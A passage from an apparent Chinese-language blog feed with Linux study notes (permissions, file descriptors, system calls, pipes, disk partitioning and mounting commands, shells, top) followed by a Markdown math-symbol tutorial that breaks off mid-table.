<h3 id="Linux-权限命令"><a href="#Linux-权限命令" class="headerlink" title="Linux 权限命令"></a>Linux 权限命令</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848133.png" alt="Linux权限解读"></p>
<p>文件的类型：</p>
<ul>
<li>d： 代表目录</li>
<li>-： 代表文件</li>
<li>l： 代表软链接（可以认为是 window 中的快捷方式）</li>
</ul>
<p>Linux 中权限分为以下几种：</p>
<ul>
<li>r：代表权限是可读，r 也可以用数字 4 表示</li>
<li>w：代表权限是可写，w 也可以用数字 2 表示</li>
<li>x：代表权限是可执行，x 也可以用数字 1 表示</li>
</ul>
<p> 超级用户可以无视普通用户的权限，即使文件目录权限是000，依旧可以访问。</p>
<p>在 linux 中的每个用户必须属于一个组，不能独立于组外。在linux中每个文件有所有者、所在组、其它组的概念。</p>
<ul>
<li>所有者（u） ：一般为文件的创建者，谁创建了该文件，就天然的成为该文件的所有者，用 ls ‐ahl 命令可以看到文件的所有者也可以使用 chown 用户名文件名来修改文件的所有者 。</li>
<li>文件所在组（g） ：当某个用户创建了一个文件后，这个文件的所在组就是该用户所在的组用 ls ‐ahl命令可以看到文件的所有组也可以使用 chgrp 组名 文件名来修改文件所在的组。</li>
<li>其它组（o） ：除开文件的所有者和所在组的用户外，系统的其它用户都是文件的其它组。</li>
</ul>
<h2 id="Linux文件描述符（句柄）"><a href="#Linux文件描述符（句柄）" class="headerlink" title="Linux文件描述符（句柄）"></a>Linux文件描述符（句柄）</h2><p>描述符表（descriptor table）：每个进程都有它独立的描述符表，它的表项是由进程打开的文件描述符来索引的。每个打开的描述符表项指向文件表中的一个表项。</p>
<p>文件表（file table）：打开文件的集合是由一张文件表来表示的，所有的进程共享这张表。每个文件表的表项组成（针对我们的目的）包括当前的文件位置、引用计数（reference count） （即当前指向该表项的描述符表项数），以及一个指向v-node表中对应表项的指针。关闭一个描述符会减少对应的文件表项中的引用计数。内核不会删除这个文件表表项，直到它的引用计数为零。</p>
<p>v-node表（v-node table）：同文件表一样，所有的进程共享这张v-node表。每个表项包含stat结构中的大多数信息，包括st_mode和st_size成员，同一个文件v-node table相同。</p>
<p>多个描述符也可以通过不同的文件表项来引用同一个文件。例如同一个filename调用open函数两次，就会发生这种情况。</p>
<p>open()函数所做的事情就是将传进去的字符串的路径在内核里面转换成相应的inode节点和结构体。执行这一任务的标准过程就是分析路径名并把它拆分成一个文件名序列，除了最后一个文件名以外，所有的文件名都必定是目录。</p>
<p>然后点击read调用后会从句柄中获取信息，然后将对应的页读到内核内存中，然后将内核buffer的内容放到应用程序buffer里。</p>
<ul>
<li>习惯上，标准输入（standard input）的文件描述符是 0，标准输出（standard output）是 1，标准错误（standard error）是 2。</li>
<li>0，1，2对应的物理设备一般是：键盘，显示器，显示器。</li>
<li>所以通常当我们成功打开文件时，返回的fd都是从3起。</li>
</ul>
<p>句柄（file descriptor，fd）：</p>
<p>close（fd）之后句柄就返回给系统，例如打开一个文件后fd是3，close之后再打开另外一个文件也还是3，但代表的文件不一样了。</p>
<h2 id="Linux系统调用实现机制"><a href="#Linux系统调用实现机制" class="headerlink" title="Linux系统调用实现机制"></a>Linux系统调用实现机制</h2><h3 id="系统调用初始化"><a href="#系统调用初始化" class="headerlink" title="系统调用初始化"></a>系统调用初始化</h3><p>系统调用处理程序 system_call() 的入口地址放在系统的中断描述符表IDT（Interrupt Descriptor Table）(一共有255个)中，Linux系统初始化时，由 trap_init() 将其填写完整，其设置系统调用处理程序的语句为：</p>
<p>set_system_gate(0x80, &amp;system_call)<br>经过初始化以后，每当执行 int 0x80(软中断) 指令时，产生一个异常使系统陷入内核空间并执行128号异常处理程序，即系统调用处理程序 system_call() 。</p>
<h3 id="系统调用公共入口"><a href="#系统调用公共入口" class="headerlink" title="系统调用公共入口"></a>系统调用公共入口</h3><p>system_call() 是所有系统调用的公共入口，其功能是保护现场，进行正确性检查，根据系统调用号跳转到具体的内核函数。内核函数执行完毕时需调用 ret_from_sys_call() ，这时完成返回用户空间前的最后检查，用 RESTORE_ALL 宏恢复现场并执行 iret 指令返回用户断点。</p>
<h3 id="保护现场"><a href="#保护现场" class="headerlink" title="保护现场"></a>保护现场</h3><ul>
<li><p>硬件（CPU）保护：ss 、 esp 、 eflags 、 cs 、 eip ，压入核心栈；</p>
</li>
<li><p>软件（操作系统）保护 </p>
<ul>
<li><p>使用 SAVE_ALL 宏将寄存器压入堆栈，加载内核的 ds 和 es ，往 edx 中放入 $(_KERNEL_DS) 以指明使用内核数据段，把内核数据段选择符装入 ds 和 es 。注意：该宏压入寄存器的顺序不是随意的，而是和系统调用的参数传递密切相关；</p>
</li>
<li><p>es 、 ds 、 eax 、 ebp 、 edi 、 esi 、 edx 、 ecx 、 ebx ，压入核心栈。</p>
</li>
</ul>
</li>
</ul>
<p>系统调用处理时的核心栈内容：</p>
<p>硬件完成 : ss esp eflags cs eip<br>软件完成 : es ds eax ebp edi esi edx ecx ebx</p>
<h3 id="返回值传递"><a href="#返回值传递" class="headerlink" title="返回值传递"></a>返回值传递</h3><p>当内核函数返回到 system_call() 时， eax中存放着内核函数的返回值。要将这个返回值传递给应用程序，内核先将 eax 放入原先 SAVE_ALL 宏保存 eax 的位置，这样当 system_call() 调用 RESTORE_ALL 恢复寄存器时， eax 便被恢复成系统调用的返回值，完成了返回值从内核空间到用户空间的传递。</p>
<h3 id="系统调用号和系统调用表"><a href="#系统调用号和系统调用表" class="headerlink" title="系统调用号和系统调用表"></a>系统调用号和系统调用表</h3><p>系统调用的数量由 NR_syscalls 宏给定，每个系统调用所对应的编号已预先在系统文件中定义，且都用一个宏表示，其定义有如下形式：</p>
<p>#define _NR_exit 1<br>#define _NR_fork 2<br>#define _NR_read 3<br>…<br>Linux的系统调用号和内核函数映射关系的系统调用表也被预先定义在系统文件中，具有如下形式：</p>
<p>.data<br>ENTRY(sys_call_table)<br>    .long SYMBOL_NAME(sys_ni_syscall)    &#x2F;* 空项 *&#x2F;<br>    .long SYMBOL_NAME(sys_exit)<br>    .long SYMBOL_NAME(sys_fork)<br>    .long SYMBOL_NAME(sys_read)<br>…</p>
<p>内核函数入口地址为： eax * 4 + sys_call_table 。</p>
<h2 id="Linux内核函数"><a href="#Linux内核函数" class="headerlink" title="Linux内核函数"></a>Linux内核函数</h2><h3 id="socketpair"><a href="#socketpair" class="headerlink" title="socketpair()"></a>socketpair()</h3><p>socketpair()函数用于创建一对无名的、相互连接的套接子。<br>如果函数成功，则返回0，创建好的套接字分别是sv[0]和sv[1]；否则返回-1，错误码保存于errno中。</p>
<p>基本用法： </p>
<ol>
<li>这对套接字可以用于全双工通信，每一个套接字既可以读也可以写。例如，可以往sv[0]中写，从sv[1]中读；或者从sv[1]中写，从sv[0]中读； </li>
<li>如果往一个套接字(如sv[0])中写入后，再从该套接字读时会阻塞，只能在另一个套接字中(sv[1])上读成功； </li>
<li>读、写操作可以位于同一个进程，也可以分别位于不同的进程，如父子进程。如果是父子进程时，一般会功能分离，一个进程用来读，一个用来写。因为文件描述副sv[0]和sv[1]是进程共享的，所以读的进程要关闭写描述符, 反之，写的进程关闭读描述符。</li>
</ol>
<h3 id="pipe"><a href="#pipe" class="headerlink" title="pipe()"></a>pipe()</h3><p><a href="https://blog.csdn.net/qq_42914528/article/details/82023408">https://blog.csdn.net/qq_42914528/article/details/82023408</a></p>
<p>pipe（）创建一个管道，一个可用于进程间通信的单向数据通道。数组pipefd用于返回引用管道末端的两个文件描述符。pipefd[0]表示管道的读取端。pipefd[1]表示管道的写入端。写入管道写入端的数据由内核缓冲，直到从管道读取端读取为止。有关更多详细信息，请参阅管道（7）。</p>
<p>管道是一种最基本的IPC机制，作用于有血缘关系的进程之间，完成数据传递。调用pipe系统函数即可创建一个管道。有如下特质：</p>
<ol>
<li><p>其本质是一个伪文件(实为内核缓冲区)</p>
</li>
<li><p>由两个文件描述符引用，一个表示读端，一个表示写端。</p>
</li>
<li><p>规定数据从管道的写端流入管道，从读端流出。</p>
</li>
</ol>
<p>管道的原理：管道实为内核使用环形队列机制，借助内核缓冲区(4k)实现。</p>
<p>管道的局限性：</p>
<p>① 数据自己读不能自己写。</p>
<p>② 数据一旦被读走，便不在管道中存在，不可反复读取。</p>
<p>③ 由于管道采用半双工通信方式。因此，数据只能在一个方向上流动。</p>
<p>④ 只能在有公共祖先的进程间使用管道。</p>
<p>常见的通信方式有，单工通信、半双工通信、全双工通信。</p>
<p>tcp协议网络数据会分包,如果没有全部到达，内核有buffer。</p>
<p>在许多类 Unix 计算机系统中， procfs 是 进程 文件系统 (file system) 的缩写，包含一个伪文件系统（启动时动态生成的文件系统），用于通过内核访问进程信息。这个文件系统通常被挂载到 &#x2F;proc 目录。由于 &#x2F;proc 不是一个真正的文件系统，它也就不占用存储空间，只是占用有限的内存。</p>
<p>挂载？</p>
<p>挂载（mounting）是指由操作系统使一个存储设备（诸如硬盘、CD-ROM或共享资源）上的电脑文件和目录可供用户通过计算机的文件系统访问的一个过程。</p>
<p>一般来说，当计算机关机时，每个已挂载存储都将经历一次卸载，以确保所有排队的数据被写入，并保证介质上文件系统结构的完整性。</p>
<h2 id="Linux系统中的7种运行级别"><a href="#Linux系统中的7种运行级别" class="headerlink" title="Linux系统中的7种运行级别"></a>Linux系统中的7种运行级别</h2><p>运行级别说明:</p>
<ul>
<li><p>0:关机</p>
</li>
<li><p>1 :单用户[类似安全模式，这个模式可以帮助找回root密码] </p>
</li>
<li><p>2:多用户状态没有网络服务</p>
</li>
<li><p>3:多用户状态有网络服务 [使用最多]</p>
</li>
<li><p>4:系统未使用保留给用户</p>
</li>
<li><p>5:图形界面 </p>
</li>
<li><p>6:系统重启</p>
</li>
</ul>
<p>常用运行级别是 <strong>3</strong> 和 <strong>5</strong> ，要修改默认的运行级别可改文件</p>
<h2 id="Linux磁盘分区、挂载"><a href="#Linux磁盘分区、挂载" class="headerlink" title="Linux磁盘分区、挂载"></a>Linux磁盘分区、挂载</h2><ul>
<li>mbr分区:</li>
</ul>
<p>1.最多支持四个主分区</p>
<p>2.系统只能安装在主分区</p>
<p>3.扩展分区要占一个主分区</p>
<p>4.MBR最大只支持2TB，但拥有最好的兼容性</p>
<ul>
<li>gtp分区:</li>
</ul>
<p>1.支持无限多个主分区（但操作系统可能限制，比如 windows下最多128个分区）</p>
<p>2.最大支持18EB的大容量（1EB&#x3D;1024 PB，1PB&#x3D;1024 TB ）</p>
<p>3.windows7 64位以后支持gtp</p>
<p>原理介绍</p>
<p>1)Linux来说无论有几个分区，分给哪一目录使用，它归根结底就只有一个根目录，一个独立且唯一的文件结构 , Linux中每个分区都是用来组成整个文件系统的一部分。</p>
<p>2)Linux采用了一种叫“载入”的处理方法，它的整个文件系统中包含了一整套的文件和目录，且将一个分区和一个目录联系起来。这时要载入的一个分区将使它的存储空间在一个目录下获得。</p>
<p>硬盘说明</p>
<p>1)Linux硬盘分IDE硬盘和SCSI硬盘，目前基本上是SCSI硬盘</p>
<p>2)对于IDE硬盘，驱动器标识符为“hdx”,其中“hd”表明分区所在设备的类型，这里是指IDE硬盘了。“x”为盘号（a为基本盘，b为基本从属盘，c为辅助主盘，d为辅助从属盘）,“”代表分区，前四个分区用数字1到4表示，它们是主分区或扩展分区，从5开始就是逻辑分区。例，hda3表示为第一个IDE硬盘上的第三个主分区或扩展分区,hdb2表示为第二个IDE硬盘上的第二个主分区或扩展分区。</p>
<p>3)对于SCSI硬盘则标识为“sdx~”，SCSI硬盘是用“sd”来表示分区所在设备的类型的，其余则和IDE硬盘的表示方法一样。sdb1 [表示第2块scsi 硬盘的第1个分区]</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211829424.png" alt="image-20211019193102040"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看所有设备的挂载情况 list block</span></span><br><span class="line">lsblk -f</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">分区命令</span></span><br><span class="line">fdisk /dev/sdb</span><br><span class="line"></span><br><span class="line">开始对/sdb分区</span><br><span class="line">m   显示命令列表</span><br><span class="line">p    显示磁盘分区 同 fdisk  –l</span><br><span class="line">n    新增分区</span><br><span class="line">d    删除分区</span><br><span class="line">w   写入并退出</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">格式化磁盘 ext4是分区类型 make file system</span></span><br><span class="line">mkfs -t ext4 /dev/sdb1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">挂载 用命令行挂载重启后会失效</span></span><br><span class="line">mount /dev/sdb1 /home/newdisk</span><br><span class="line">umount /dev/sdb1 或者 umount /home/newdisk</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">永久挂载</span></span><br><span class="line">vim /etc/fstab</span><br><span class="line">mount -a</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">磁盘情况查询 disk free</span></span><br><span class="line">df -h</span><br><span class="line"></span><br><span class="line">du -h  /目录</span><br><span class="line">   -s 指定目录占用大小汇总</span><br><span class="line">   -h 带计量单位</span><br><span class="line">   -a 含文件</span><br><span class="line">   --max-depth=1  子目录深度</span><br><span class="line">   -c 列出明细的同时，增加汇总值</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查询 /usr目录的磁盘占用情况，深度为1</span></span><br><span class="line">du  -ach  --max-depth=1  /usr</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">统计/home文件夹下文件的个数</span></span><br><span class="line">ls -la /home/ | grep &quot;^-&quot; | wc -l</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">统计/home 文件夹下目录的个数，包括子文件夹里的</span></span><br><span class="line">ls -lr /home/ | grep &quot;^d&quot; | wc -l</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">以树状显示 home 目录结构</span></span><br><span class="line">yum install tree</span><br><span class="line">tree /home</span><br></pre></td></tr></table></figure>

<h2 id="Shell和Bash"><a href="#Shell和Bash" class="headerlink" title="Shell和Bash"></a>Shell和Bash</h2><p>Shell 这个单词的原意是“外壳”，跟 kernel（内核）相对应，比喻内核外面的一层，即用户跟内核交互的对话界面。</p>
<p>首先，Shell 是一个程序，提供一个与用户对话的环境。这个环境只有一个命令提示符，让用户从键盘输入命令，所以又称为命令行环境（command line interface，简写为 CLI）。Shell 接收到用户输入的命令，将命令送入操作系统执行，并将结果返回给用户。</p>
<p>其次，Shell 是一个命令解释器，解释用户输入的命令。它支持变量、条件判断、循环操作等语法，所以用户可以用 Shell 命令写出各种小程序，又称为脚本（script）。这些脚本都通过 Shell 的解释执行，而不通过编译。</p>
<p>最后，Shell 是一个工具箱，提供了各种小工具，供用户方便地使用操作系统的功能。</p>
<p>Shell 有很多种，只要能给用户提供命令行环境的程序，都可以看作是 Shell。</p>
<p>历史上，主要的 Shell 有下面这些。</p>
<ul>
<li>Bourne Shell（sh）</li>
<li>Bourne Again shell（bash）</li>
<li>C Shell（csh）</li>
<li>TENEX C Shell（tcsh）</li>
<li>Korn shell（ksh）</li>
<li>Z Shell（zsh）</li>
<li>Friendly Interactive Shell（fish）</li>
</ul>
<p>Bash 是目前最常用的 Shell，除非特别指明，下文的 Shell 和 Bash 当作同义词使用，可以互换。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前运行的 Shell</span></span><br><span class="line">echo $SHELL</span><br><span class="line">/bin/bash</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前的 Linux 系统安装的所有 Shell</span></span><br><span class="line">cat /etc/shells</span><br></pre></td></tr></table></figure>

<p>Linux 允许每个用户使用不同的 Shell，用户的默认 Shell 一般都是 Bash，或者与 Bash 兼容。</p>
<p>根用户（root）的提示符，不以美元符号（<code>$</code>）结尾，而以井号（<code>#</code>）结尾，用来提醒用户，现在具有根权限，可以执行各种操作，务必小心，不要出现误操作。这个符号是可以自己定义的</p>
<p>进入命令行环境以后，一般就已经打开 Bash 了。如果你的 Shell 不是 Bash，可以输入<code>bash</code>命令启动 Bash。</p>
<h2 id="动态监控进程"><a href="#动态监控进程" class="headerlink" title="动态监控进程"></a>动态监控进程</h2><p> top与ps命令很相似。它们都用来显示正在执行的进程。Top与ps最大的不同之处，在于top在执行一段时间可以更新正在运行的的进程（默认每3秒变化一次）。</p>
<table>
<thead>
<tr>
<th>选项</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>-d  秒数</td>
<td>指定top命令每隔几秒更新。默认是3秒在top命令的交互模式当中可以执行的命令。</td>
</tr>
<tr>
<td>-i</td>
<td>使top不显示任何闲置或者僵死进程。</td>
</tr>
<tr>
<td>-p</td>
<td>通过指定监控进程ID来仅仅监控某个进程的状态。</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>操作</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>P</td>
<td>以CPU使用率排序，默认就是此项</td>
</tr>
<tr>
<td>M</td>
<td>以内存的使用率排序</td>
</tr>
<tr>
<td>N</td>
<td>以PID排序</td>
</tr>
<tr>
<td>q</td>
<td>退出top</td>
</tr>
<tr>
<td>u  输入用户名</td>
<td>监视特定用户</td>
</tr>
<tr>
<td>k  进程ID号</td>
<td>终止指定的进程</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>base</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Markdown 教程</title>
    <url>/2021/12/21/Markdown/</url>
    <content><![CDATA[<h1 id="Markdown-教程"><a href="#Markdown-教程" class="headerlink" title="Markdown 教程"></a>Markdown 教程</h1><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211234999.png" alt="img"></p>
<p>Markdown 是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档。</p>
<p>Markdown 语言在 2004 由约翰·格鲁伯（英语：John Gruber）创建。</p>
<p>Markdown 编写的文档可以导出 HTML 、Word、图像、PDF、Epub 等多种格式的文档。</p>
<p>Markdown 编写的文档后缀为 <strong>.md</strong>, <strong>.markdown</strong>。</p>
<h2 id="Markdown-数学公式"><a href="#Markdown-数学公式" class="headerlink" title="Markdown 数学公式"></a>Markdown 数学公式</h2><h2 id="上-x2F-下标"><a href="#上-x2F-下标" class="headerlink" title="上&#x2F;下标"></a><strong>上&#x2F;下标</strong></h2><table>
<thead>
<tr>
<th>算式</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$x^2 $</td>
<td>x^2</td>
</tr>
<tr>
<td>$y_1 $</td>
<td>y_1</td>
</tr>
</tbody></table>
<h2 id="分式"><a href="#分式" class="headerlink" title="分式"></a><strong>分式</strong></h2><table>
<thead>
<tr>
<th>算式</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>1&#x2F;2</td>
<td>1&#x2F;2</td>
</tr>
<tr>
<td>$\frac{1}{2}$</td>
<td>\frac{1}{2}</td>
</tr>
</tbody></table>
<h2 id="省略号"><a href="#省略号" class="headerlink" title="省略号"></a><strong>省略号</strong></h2><table>
<thead>
<tr>
<th>省略号</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\cdots$</td>
<td>\cdots</td>
</tr>
</tbody></table>
<h2 id="开根号"><a href="#开根号" class="headerlink" title="开根号"></a><strong>开根号</strong></h2><table>
<thead>
<tr>
<th>算式</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\sqrt{2}$</td>
<td>\sqrt{2}</td>
</tr>
</tbody></table>
<h2 id="矢量"><a href="#矢量" class="headerlink" title="矢量"></a><strong>矢量</strong></h2><table>
<thead>
<tr>
<th>算式</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\vec{a}$</td>
<td>\vec{a}</td>
</tr>
</tbody></table>
<h2 id="积分"><a href="#积分" class="headerlink" title="积分"></a><strong>积分</strong></h2><table>
<thead>
<tr>
<th>算式</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\int{x}dx$</td>
<td>\int{x}dx</td>
</tr>
<tr>
<td>$\int_{1}^{2}{x}dx$</td>
<td>\int_{1}^{2}{x}dx</td>
</tr>
</tbody></table>
<h2 id="极限"><a href="#极限" class="headerlink" title="极限"></a><strong>极限</strong></h2><table>
<thead>
<tr>
<th>算式</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\lim{a+b}$</td>
<td>\lim{a+b}</td>
</tr>
<tr>
<td>$\lim_\limits{n\rightarrow+\infty}$</td>
<td>\lim_{n\rightarrow+\infty}</td>
</tr>
</tbody></table>
<h2 id="累加"><a href="#累加" class="headerlink" title="累加"></a><strong>累加</strong></h2><table>
<thead>
<tr>
<th>算式</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\sum{a}$</td>
<td>\sum{a}</td>
</tr>
<tr>
<td>$\sum_{n&#x3D;1}^{100}{a_n}$</td>
<td>\sum_{n&#x3D;1}^{100}{a_n}</td>
</tr>
</tbody></table>
<h2 id="累乘"><a href="#累乘" class="headerlink" title="累乘"></a><strong>累乘</strong></h2><table>
<thead>
<tr>
<th>算式</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\prod{x}$</td>
<td>\prod{x}</td>
</tr>
<tr>
<td>$\prod_{n&#x3D;1}^{99}{x_n}$</td>
<td>\prod_{n&#x3D;1}^{99}{x_n}</td>
</tr>
</tbody></table>
<h2 id="希腊字母"><a href="#希腊字母" class="headerlink" title="希腊字母"></a><strong>希腊字母</strong></h2><table>
<thead>
<tr>
<th>大写</th>
<th>Markdown</th>
<th>小写</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$A$</td>
<td>A</td>
<td>$\alpha$</td>
<td>\alpha</td>
</tr>
<tr>
<td>$B$</td>
<td>B</td>
<td>$\beta$</td>
<td>\beta</td>
</tr>
<tr>
<td>$\Gamma$</td>
<td>\Gamma</td>
<td>$\gamma$</td>
<td>\gamma</td>
</tr>
<tr>
<td>$\Delta$</td>
<td>\Delta</td>
<td>$\delta$</td>
<td>\delta</td>
</tr>
<tr>
<td>$E$</td>
<td>E</td>
<td>$\epsilon$</td>
<td>\epsilon</td>
</tr>
<tr>
<td></td>
<td></td>
<td>$\varepsilon$</td>
<td>\varepsilon</td>
</tr>
<tr>
<td>$Z$</td>
<td>Z</td>
<td>$\zeta$</td>
<td>\zeta</td>
</tr>
<tr>
<td>$H$</td>
<td>H</td>
<td>$\eta$</td>
<td>\eta</td>
</tr>
<tr>
<td>$\Theta$</td>
<td>\Theta</td>
<td>$\theta$</td>
<td>\theta</td>
</tr>
<tr>
<td>$I$</td>
<td>I</td>
<td>$\iota$</td>
<td>\iota</td>
</tr>
<tr>
<td>$K$</td>
<td>K</td>
<td>$\kappa$</td>
<td>\kappa</td>
</tr>
<tr>
<td>$\Lambda$</td>
<td>\Lambda</td>
<td>$\lambda$</td>
<td>\lambda</td>
</tr>
<tr>
<td>$M$</td>
<td>M</td>
<td>$\mu$</td>
<td>\mu</td>
</tr>
<tr>
<td>$N$</td>
<td>N</td>
<td>$\nu$</td>
<td>\nu</td>
</tr>
<tr>
<td>$\Xi$</td>
<td>\Xi</td>
<td>$\xi$</td>
<td>\xi</td>
</tr>
<tr>
<td>$O$</td>
<td>O</td>
<td>$\omicron$</td>
<td>\omicron</td>
</tr>
<tr>
<td>$\Pi$</td>
<td>\Pi</td>
<td>$\pi$</td>
<td>\pi</td>
</tr>
<tr>
<td>$P$</td>
<td>P</td>
<td>$\rho$</td>
<td>\rho</td>
</tr>
<tr>
<td>$\Sigma$</td>
<td>\Sigma</td>
<td>$\sigma$</td>
<td>\sigma</td>
</tr>
<tr>
<td>$T$</td>
<td>T</td>
<td>$\tau$</td>
<td>\tau</td>
</tr>
<tr>
<td>$\Upsilon$</td>
<td>\Upsilon</td>
<td>$\upsilon$</td>
<td>\upsilon</td>
</tr>
<tr>
<td>$\Phi$</td>
<td>\Phi</td>
<td>$\phi$</td>
<td>\phi</td>
</tr>
<tr>
<td></td>
<td></td>
<td>$\varphi$</td>
<td>\varphi</td>
</tr>
<tr>
<td>$X$</td>
<td>X</td>
<td>$\chi$</td>
<td>\chi</td>
</tr>
<tr>
<td>$\Psi$</td>
<td>\Psi</td>
<td>$\psi$</td>
<td>\psi</td>
</tr>
<tr>
<td>$\Omega$</td>
<td>\Omega</td>
<td>$\omega$</td>
<td>\omega</td>
</tr>
</tbody></table>
<h2 id="三角函数"><a href="#三角函数" class="headerlink" title="三角函数"></a>三角函数</h2><table>
<thead>
<tr>
<th>三角函数</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\sin$</td>
<td>\sin</td>
</tr>
</tbody></table>
<h2 id="对数函数"><a href="#对数函数" class="headerlink" title="对数函数"></a><strong>对数函数</strong></h2><table>
<thead>
<tr>
<th>算式</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\ln2$</td>
<td>\ln2</td>
</tr>
<tr>
<td>$\log_28$</td>
<td>\log_28</td>
</tr>
<tr>
<td>$\lg10$</td>
<td>\lg10</td>
</tr>
</tbody></table>
<h2 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a><strong>关系运算符</strong></h2><table>
<thead>
<tr>
<th>运算符</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\pm$</td>
<td>\pm</td>
</tr>
<tr>
<td>$\times$</td>
<td>\times</td>
</tr>
<tr>
<td>$\cdot$</td>
<td>\cdot</td>
</tr>
<tr>
<td>$\div$</td>
<td>\div</td>
</tr>
<tr>
<td>$\neq$</td>
<td>\neq</td>
</tr>
<tr>
<td>$\equiv$</td>
<td>\equiv</td>
</tr>
<tr>
<td>$\leq$</td>
<td>\leq</td>
</tr>
<tr>
<td>$\geq$</td>
<td>\geq</td>
</tr>
<tr>
<td>$\approx$</td>
<td>\approx</td>
</tr>
</tbody></table>
<h2 id="其它特殊字符"><a href="#其它特殊字符" class="headerlink" title="其它特殊字符"></a><strong>其它特殊字符</strong></h2><table>
<thead>
<tr>
<th>符号</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\forall$</td>
<td>\forall</td>
</tr>
<tr>
<td>$\infty$</td>
<td>\infty</td>
</tr>
<tr>
<td>$\emptyset$</td>
<td>\emptyset</td>
</tr>
<tr>
<td>$\exists$</td>
<td>\exists</td>
</tr>
<tr>
<td>$\nabla$</td>
<td>\nabla</td>
</tr>
<tr>
<td>$\bot$</td>
<td>\bot</td>
</tr>
<tr>
<td>$\angle$</td>
<td>\angle</td>
</tr>
<tr>
<td>$\because$</td>
<td>\because</td>
</tr>
<tr>
<td>$\therefore$</td>
<td>\therefore</td>
</tr>
<tr>
<td>$\lceil$</td>
<td>\lceil</td>
</tr>
<tr>
<td>$\rceil$</td>
<td>\rceil</td>
</tr>
<tr>
<td>$\lfloor$</td>
<td>\lfloor</td>
</tr>
<tr>
<td>$\rfloor$</td>
<td>\rfloor</td>
</tr>
</tbody></table>
<h2 id="矩阵"><a href="#矩阵" class="headerlink" title="矩阵"></a>矩阵</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">a = \left[</span><br><span class="line">\matrix&#123;</span><br><span class="line">  \alpha_1 &amp; test1\\</span><br><span class="line">  \alpha_2 &amp; test2\\</span><br><span class="line">  \alpha_3 &amp; test3 </span><br><span class="line">&#125;</span><br><span class="line">\right]</span><br><span class="line">$$</span><br></pre></td></tr></table></figure>

<p>$$<br>a &#x3D; \left(<br>\matrix{<br>  \alpha_1 &amp; test1\<br>  \alpha_2 &amp; test2\<br>  \alpha_3 &amp; test3<br>}<br>\right)<br>$$</p>
<h2 id="离散数学"><a href="#离散数学" class="headerlink" title="离散数学"></a>离散数学</h2><table>
<thead>
<tr>
<th>符号</th>
<th>markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\leftrightarrow$</td>
<td>\leftrightarrow</td>
</tr>
<tr>
<td>$\leftarrow$</td>
<td>\leftarrow</td>
</tr>
<tr>
<td>$\rightarrow$</td>
<td>\rightarrow</td>
</tr>
<tr>
<td>$\Leftrightarrow$</td>
<td>\Leftrightarrow</td>
</tr>
<tr>
<td>$\Rightarrow$</td>
<td>\Rightarrow</td>
</tr>
<tr>
<td>$\Leftarrow$</td>
<td>\Leftarrow</td>
</tr>
<tr>
<td>$\neg$</td>
<td>\neg</td>
</tr>
<tr>
<td>$\cup$</td>
<td>\cup</td>
</tr>
<tr>
<td>$\cap$</td>
<td>\cap</td>
</tr>
<tr>
<td>$\and$</td>
<td>\and</td>
</tr>
<tr>
<td>$\or$</td>
<td>\or</td>
</tr>
<tr>
<td>$\subset$</td>
<td>\subset</td>
</tr>
<tr>
<td>$\supset$</td>
<td>\supset</td>
</tr>
<tr>
<td>$\subseteq$</td>
<td>\subseteq</td>
</tr>
<tr>
<td>$\supseteq$</td>
<td>\supseteq</td>
</tr>
<tr>
<td>$\in$</td>
<td>\in</td>
</tr>
<tr>
<td>$\notin$</td>
<td>\notin</td>
</tr>
<tr>
<td>$\ni$</td>
<td>\ni</td>
</tr>
<tr>
<td>$\oplus$</td>
<td>\oplus</td>
</tr>
<tr>
<td>$\Pi$</td>
